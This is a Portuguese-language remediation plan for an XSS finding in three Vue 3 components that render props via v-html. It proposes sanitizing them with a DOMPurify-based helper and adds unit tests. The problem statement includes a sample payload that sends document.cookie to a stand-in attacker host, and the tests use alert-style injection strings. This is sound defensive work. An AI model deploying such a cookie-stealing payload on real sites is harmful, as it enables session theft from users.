# Plano de Implementação — Issue #68

## Descrição e Causa Raiz

### Problema
Durante auditoria de segurança (Lente 5 — Segurança), identificou-se que os componentes de interface `MaxTitle1`, `MaxTitle2` e `MaxEmptyDiv` renderizam propriedades dinâmicas de texto (`subtitle`, `subTitle`, `h2` e `label`) diretamente através da diretiva `v-html` do Vue 3, sem realizar a higienização do conteúdo contra injeção de código malicioso (Cross-Site Scripting - XSS).

A diretiva `v-html` manipula diretamente a propriedade `innerHTML` do elemento no DOM. Se o conteúdo passado a esses componentes tiver origem em dados dinâmicos do backend, parâmetros de URL, metadados de entidades ou entradas de usuários não sanitizadas, strings maliciosas (por exemplo, `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">` ou payloads com `<script>`, `<iframe>` e eventos `onload`/`onerror`) serão interpretadas e executadas no contexto do navegador do usuário autenticado.

Embora o projeto já disponha do utilitário padronizado `sanitizeHtml` (baseado em `dompurify` com allowlist estrita em `src/helpers/sanitizeHtml.ts`), esses três componentes não estavam utilizando o helper antes da injeção no DOM.

### Causa Raiz Comprovada
- **MaxTitle1:** `src/components/MaxTitle1.vue:8`
  ```html
  8: <div v-if="resolvedSubtitle" class="text-sm t2-main-text" v-html="resolvedSubtitle"></div>
  ```
  `resolvedSubtitle` é uma propriedade computada (`props.subtitle ?? props.subTitle ?? props.h2`) sem qualquer sanitização prévia.

- **MaxTitle2:** `src/components/MaxTitle2.vue:9`
  ```html
  9: <div v-if="resolvedSubtitle" class="text-h2" v-html="resolvedSubtitle"></div>
  ```
  `resolvedSubtitle` é uma propriedade computada (`props.subtitle ?? props.subTitle ?? props.h2`) injetada diretamente via `v-html`.

- **MaxEmptyDiv:** `src/components/MaxEmptyDiv.vue:9`
  ```html
  9: <div v-html="attrs.label ?? 'Sem Registros' " class="label" />
  ```
  O valor de `attrs.label` (ou o fallback `'Sem Registros'`) é renderizado diretamente via `v-html` sem higienização.

- **Rastreamento Reverso de Dados e Fluxo Causal:**
  `Entrada Externa / Resposta de API / Store Pinia` ➔ `Prop / Attr repassado ao componente (<MaxTitle1 :subtitle="data.description" /> ou <MaxEmptyDiv :label="data.emptyMsg" />)` ➔ `Template avalia v-html="resolvedSubtitle" ou v-html="attrs.label"` ➔ `Vue executa el.innerHTML = valor bruto` ➔ `Navegador executa atributos inline maliciosos (onerror, onload) e tags injetadas` ➔ **Execução de Script Não Autorizado (XSS / DOM XSS)**.

---

## Arquivos Afetados

1. `src/components/MaxTitle1.vue` — Importar `sanitizeHtml` de `../helpers/sanitizeHtml` e higienizar a computada `resolvedSubtitle`.
2. `src/components/MaxTitle2.vue` — Importar `sanitizeHtml` de `../helpers/sanitizeHtml` e higienizar a computada `resolvedSubtitle`.
3. `src/components/MaxEmptyDiv.vue` — Importar `sanitizeHtml` de `../helpers/sanitizeHtml` e criar a computada reativa `sanitizedLabel` para higienizar `attrs.label ?? 'Sem Registros'`.
4. `tests/components/DisplayAndTransitions.test.ts` — Adicionar casos de testes unitários para `MaxTitle1`, `MaxTitle2` e `MaxEmptyDiv` cobrindo a remoção de payloads XSS maliciosos e a preservação de tags HTML permitidas.

---

## Execuções Propostas

### 1. Refatoração em `src/components/MaxTitle1.vue`
- Importar a função `sanitizeHtml`:
  ```typescript
  import { sanitizeHtml } from '../helpers/sanitizeHtml';
  ```
- Atualizar a resolução da computada `resolvedSubtitle` para aplicar `sanitizeHtml` quando houver valor definido:
  ```typescript
  const rawSubtitle = computed(() => props.subtitle ?? props.subTitle ?? props.h2);
  const resolvedSubtitle = computed(() => (rawSubtitle.value ? sanitizeHtml(rawSubtitle.value) : ''));
  ```
- Manter o template limpo e consistente:
  ```html
  <div v-if="resolvedSubtitle" class="text-sm t2-main-text" v-html="resolvedSubtitle"></div>
  ```

### 2. Refatoração em `src/components/MaxTitle2.vue`
- Importar a função `sanitizeHtml`:
  ```typescript
  import { sanitizeHtml } from '../helpers/sanitizeHtml';
  ```
- Atualizar a resolução da computada `resolvedSubtitle` para aplicar `sanitizeHtml` quando houver valor definido:
  ```typescript
  const rawSubtitle = computed(() => props.subtitle ?? props.subTitle ?? props.h2);
  const resolvedSubtitle = computed(() => (rawSubtitle.value ? sanitizeHtml(rawSubtitle.value) : ''));
  ```
- Manter o template:
  ```html
  <div v-if="resolvedSubtitle" class="text-h2" v-html="resolvedSubtitle"></div>
  ```

### 3. Refatoração em `src/components/MaxEmptyDiv.vue`
- Importar `computed` e `sanitizeHtml`:
  ```typescript
  import { computed, useAttrs } from 'vue';
  import MaxIcon from './MaxIcon.vue';
  import { sanitizeHtml } from '../helpers/sanitizeHtml';
  ```
- Criar a computada `sanitizedLabel`:
  ```typescript
  const attrs = useAttrs();
  const sanitizedLabel = computed(() => {
      const raw = attrs.label ?? 'Sem Registros';
      return sanitizeHtml(String(raw));
  });
  ```
- No template, substituir a interpolação inline direta de `attrs.label` por `sanitizedLabel`:
  ```html
  <slot name="label">
      <div v-html="sanitizedLabel" class="label" />
  </slot>
  ```

---

## Especificação de Teste TDD (Red-Green)

### 1. Etapa Red (Falha Prévia)
Adicionar novos testes em `tests/components/DisplayAndTransitions.test.ts`:

```typescript
describe('MaxTitle1 - Sanitização XSS', () => {
    it('sanitiza código malicioso no subtítulo prevenindo XSS via v-html', () => {
        const wrapper = mount(MaxTitle1, {
            props: {
                title: 'Título Seguro',
                subtitle: '<img src="x" onerror="alert(1)">Texto Seguro <b>Negrito</b>'
            },
            global: defaultGlobal
        });

        const subtitleEl = wrapper.find('.t2-main-text');
        expect(subtitleEl.exists()).toBe(true);
        expect(subtitleEl.html()).not.toContain('onerror');
        expect(subtitleEl.html()).toContain('<b>Negrito</b>');
        expect(subtitleEl.html()).toContain('<img src="x">');
    });

    it('remove tags de script completamente do subtítulo', () => {
        const wrapper = mount(MaxTitle1, {
            props: {
                title: 'Título Seguro',
                subtitle: '<script>alert("xss")</script>'
            },
            global: defaultGlobal
        });

        expect(wrapper.find('.t2-main-text').exists()).toBe(false);
    });
});

describe('MaxTitle2 - Sanitização XSS', () => {
    it('sanitiza código malicioso no subtítulo prevenindo XSS via v-html', () => {
        const wrapper = mount(MaxTitle2, {
            props: {
                title: 'Título 2',
                subtitle: '<img src="x" onerror="alert(1)">Subtítulo <i>Itálico</i>'
            },
            global: defaultGlobal
        });

        const subtitleEl = wrapper.find('.text-h2');
        expect(subtitleEl.exists()).toBe(true);
        expect(subtitleEl.html()).not.toContain('onerror');
        expect(subtitleEl.html()).toContain('<i>Itálico</i>');
    });
});

describe('MaxEmptyDiv - Sanitização XSS', () => {
    it('sanitiza código malicioso no label prevenindo XSS via v-html', () => {
        const wrapper = mount(MaxEmptyDiv, {
            attrs: {
                label: '<img src="x" onerror="alert(1)">Nenhum registro <strong>encontrado</strong>'
            },
            global: {
                stubs: {
                    MaxIcon: { template: '<span class="max-icon"></span>' }
                }
            }
        });

        const labelEl = wrapper.find('.label');
        expect(labelEl.exists()).toBe(true);
        expect(labelEl.html()).not.toContain('onerror');
        expect(labelEl.html()).toContain('<strong>encontrado</strong>');
    });
});
```

*Comportamento na Etapa Red:*
Antes da alteração, o teste que verifica `expect(subtitleEl.html()).not.toContain('onerror')` falha, pois `onerror="alert(1)"` é renderizado integralmente no DOM sem filtro.

### 2. Etapa Green (Sucesso Pós-Correção)
Após aplicar `sanitizeHtml` nos três componentes, os testes acima e todos os 17 testes existentes em `DisplayAndTransitions.test.ts` passam com 100% de sucesso.

---

## Banco de Dados

- **Nenhuma** migration ou alteração de banco de dados necessária (correção restrita a componentes de front-end Vue 3).

---

## Riscos de Quebra e Não-Regressão

1. **Quebra de Tags HTML Válidas:** A função `sanitizeHtml` já possui allowlist testada com suporte aos elementos comuns de formatação de texto (`b`, `strong`, `i`, `em`, `br`, `span`, `small`, `p`, `u`, `sub`, `sup`, `code`, `pre`, `ul`, `ol`, `li`, `a`, `img`) e atributos seguros (`href`, `target`, `class`, `style`, `rel`, `src`, `alt`, `title`, `width`, `height`). Portanto, layouts ricos ou estilizações inline existentes nos subtítulos e labels continuam sendo renderizados perfeitamente.
2. **Reatividade:** A utilização de `computed` garante que alterações reativas nas props ou attrs continuem atualizando a árvore do DOM instantaneamente.
3. **Contrato de Props e Slots:** Nenhuma prop, slot ou evento foi alterado ou renomeado, garantindo 100% de compatibilidade retroativa.

---

## Validação

1. **Execução da suíte de testes unitários:**
   ```bash
   npx vitest run tests/components/DisplayAndTransitions.test.ts
   ```
2. **Execução da suíte de testes de helpers (incluindo sanitizeHtml):**
   ```bash
   npx vitest run tests/helpers/sanitizeHtml.test.ts
   ```
3. **Checagem de tipagem estática TypeScript:**
   ```bash
   npm run type-check
   ```
4. **Validação de Linting e Estilos:**
   ```bash
   npm run lint
   ```

---

## Skills Aplicáveis

- `systematic-debugging-best-practices`
- `planning-with-files`
- `vue-debugging-best-practices`
- `vue-components`
- `tdd`
- `code-review`
- `production-code-audit`
- `security-audit`
